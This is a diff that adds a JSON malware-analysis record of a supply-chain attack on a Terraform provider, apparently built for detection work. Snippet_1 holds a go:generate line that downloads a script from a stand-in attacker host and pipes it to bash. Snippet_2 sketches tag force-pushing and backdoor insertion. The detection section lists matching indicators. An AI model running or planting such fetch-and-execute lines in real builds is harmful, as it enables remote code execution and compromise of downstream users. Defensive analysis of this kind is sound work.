@@ -1,0 +1,114 @@
+{
+  "package_info": {
+    "package_name": "chainguard-cosign-terraform-provider",
+    "package_manager": "Terraform Registry (custom provider, GitHub source)",
+    "package_versions": "0.0.17 (and any unpinned versions)",
+    "why_malicious": "The package is malicious because it enables a supply chain attack: a malicious contributor can submit a pull request with a //go:generate directive that executes arbitrary code during the build pipeline. This allows remote code execution, repository tampering, and compromise of downstream Docker images. The absence of a .terraform.lock.hcl file and unsafe GitHub Actions workflow configuration (pull_request_target with write permissions) further facilitate this attack by allowing untrusted code to run with elevated permissions."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "CI/CD build pipeline during go generate phase",
+        "file_location": "*.go (any Go source file containing the //go:generate directive)",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "//go:generate curl -fsSL https://attacker.com/stage2.sh | bash",
+      "code_language": "go (directive triggers shell command)",
+      "code_behavior": "During the CI/CD build pipeline, the go generate command executes a shell command embedded in a comment, which downloads a remote Bash script from attacker.com and executes it via bash, resulting in arbitrary code execution within the build environment.",
+      "malice_analysis": {
+        "why_suspicious": "Embedding a remote code execution command in a go:generate directive is highly suspicious, as it allows untrusted code to run during the build process without review.",
+        "violated_expectations": "go:generate is expected to run deterministic, local code generation tools, not to download and execute remote scripts from untrusted sources.",
+        "similar_legitimate_use": "Legitimate use of go:generate includes running tools like stringer or mockgen for code generation, but never for fetching and executing remote scripts.",
+        "key_indicators": [
+          "go:generate directive invoking network utilities (curl, wget)",
+          "Piping output of remote script directly to shell interpreter (bash, sh)",
+          "Non-deterministic, non-local code execution during build",
+          "Presence of external URLs in go:generate comments"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "CI/CD build pipeline, immediately after go generate (as executed by the attacker's stage2.sh script)",
+        "file_location": "stage2.sh (downloaded and executed by go:generate directive)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "git (repository write access)"
+        ]
+      },
+      "code_snippet": "git checkout -b attacker-branch\n# Insert backdoor code\n# Poison release artifacts\ngit tag -f 0.0.17\n# Force push tag and branch",
+      "code_language": "shell",
+      "code_behavior": "Immediately after go generate, the downloaded Bash script creates a new branch, injects a backdoor into the codebase, force-pushes the release tag 0.0.17 to point to the malicious commit, and poisons release artifacts, resulting in the publication of a compromised provider.",
+      "malice_analysis": {
+        "why_suspicious": "Automated manipulation of repository tags and branches, especially force-pushing release tags and injecting backdoors, is a classic supply chain attack technique that subverts the integrity of release artifacts.",
+        "violated_expectations": "Normal build scripts do not rewrite release tags, create new branches, or inject backdoors into the codebase as part of the build process.",
+        "similar_legitimate_use": "Release automation may update tags or branches, but only in trusted, controlled workflows—not in response to untrusted pull requests or via remote scripts.",
+        "key_indicators": [
+          "Force-pushing tags or branches from CI/CD jobs",
+          "Automated code injection or backdoor placement",
+          "Tampering with release artifacts during build",
+          "Execution of unreviewed scripts with repository write access"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker submits a pull request from a fork containing a malicious //go:generate directive in a Go source file.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Malicious code is introduced into the codebase and awaits execution during CI build."
+    },
+    {
+      "step": 2,
+      "action": "During CI, the go generate command executes the directive, downloading and running the attacker's Bash script from attacker.com.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "The attacker's stage2.sh script is executed with CI/CD pipeline permissions."
+    },
+    {
+      "step": 3,
+      "action": "The stage2.sh script manipulates the repository: creates a new branch, injects a backdoor, force-pushes the release tag 0.0.17 to a malicious commit, and poisons release artifacts.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "A malicious provider is published, and downstream consumers are exposed to the compromised code."
+    },
+    {
+      "step": 4,
+      "action": "If not detected, the poisoned provider is used in downstream workflows, potentially compromising Docker images or other critical infrastructure.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Final goal: supply chain compromise of Chainguard Docker images and downstream systems."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "go:generate directives in Go source files invoking network utilities (curl, wget) or shell interpreters (bash, sh)",
+      "CI/CD pipeline execution of go generate on code from untrusted pull requests",
+      "Automated force-push of release tags or branches from CI/CD jobs",
+      "Execution of remote scripts during build or code generation phases"
+    ],
+    "file_indicators": [
+      "*.go files containing //go:generate lines with external URLs or shell commands",
+      "Presence of stage2.sh or similarly named scripts downloaded at build time",
+      "Absence of .terraform.lock.hcl file (indicating unlocked provider versions)",
+      "GitHub Actions workflows using pull_request_target with write permissions"
+    ],
+    "network_indicators": [
+      "CI/CD build machines making outbound HTTP/HTTPS requests to non-canonical or untrusted domains (e.g., attacker.com) during build",
+      "Unexpected downloads initiated during go generate or build steps"
+    ],
+    "how_to_detect": "Monitor build pipelines for go:generate directives that invoke network utilities or shell interpreters, especially those referencing external URLs. Flag any go:generate lines that download and execute remote scripts. Detect and alert on force-pushes of tags or branches from CI/CD jobs, particularly in response to pull_request_target events. Alert on the absence of .terraform.lock.hcl in Terraform provider builds. Monitor for outbound network connections from build jobs to non-standard domains during code generation or build steps. Review GitHub Actions workflows for unsafe configurations (e.g., pull_request_target with write permissions)."
+  }
+}
